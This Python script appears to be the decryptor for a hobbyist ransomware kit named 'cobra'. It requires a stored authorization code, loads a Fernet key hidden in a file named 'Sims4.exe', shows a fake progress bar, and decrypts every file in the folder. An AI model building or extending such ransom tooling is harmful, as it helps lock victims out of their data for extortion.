from logging import shutdown
import os
import sys
import random
from time import sleep
from cryptography.fernet import Fernet as Crypto

# SETTINGS

keyfilename = "Sims4.exe"
authorizationCodePath = "PATH\\TO\\FILE\\FOLDER"

# END OF SETTINGS

files = []
messages = ["Injecting antidote...", "Forging Thor's hammer...", "Don't worry, the needle won't hurt!", "GottA be sAfe online, All the time every site your seArch be Alert!~", "Let's be honest, VPNs suck.", "Hide your identity? As if!", "JavaScript > Python", "Injecting...", "Smiting...", "Relaxing processor", "Imagine if the loading was fake lol", "A slap in the face for you!~"]
intros = ['dwdw we can handle cobra snakes', 'did you get that caught up?', 'it will all be over soon', 'hold on, this works?', 'cobra snakes are dangerous, but not too dangerous.. said nobody.', 'handling cleaning coffee mugs since 1987!', 'made for cleaning up COBRA attacks on your pc']

intro = intros[random.randint(0, len(intros) - 1)]
print(intro)
lines = ""
for i in range(len(intro) + 1):
    lines = lines + "-"
print(lines)

filestext = ""
for file in os.listdir():
    if file == "cobra.py" or file == keyfilename or file == "cobraattackdefender.py" or file == "authcode.cobra" or file == "desktop.ini":
        continue
    if os.path.isfile(file):
        files.append(file)
        if filestext == "":
            filestext = file
        else:
            filestext = filestext + ", " + file

print("Files found to decrypt: " + filestext)

# Make sure that they got the key.
auth = ""

with open(authorizationCodePath, "rb") as authorizationcode:
    code = authorizationcode.read()
    auth = str(code)

authauth = input("Input authorization key (Not caps sensitive): ")
if (not authauth.lower() == ((auth.lower()).split("'")[1]).split("'")[0]):
    print("Incorrect authorization key.")
    sleep(3)
    sys.exit()
else:
    print("Process 'authorization' complete.")

with open(keyfilename, "rb") as key:
    secretkey = key.read()
    secretkeystring = str(secretkey)
    secretkeystring2 = secretkeystring.split("'")[1].split("'")[0]
    print("Key recognised: " + str(secretkeystring2))
sleep(2)

for i in range(101):
        print(str(i) + "%" + " - " + messages[random.randint(0, len(messages) - 1)])
        sleep(random.randint(1, 10) / 100)

for file in files:
    with open(file, "rb") as thefile:
        contents = thefile.read()
    contents_decrypted = Crypto(secretkey).decrypt(contents)
    with open(file, "wb") as thefile:
        thefile.write(contents_decrypted)

print("Data back! Enjoy!~")
sleep(10)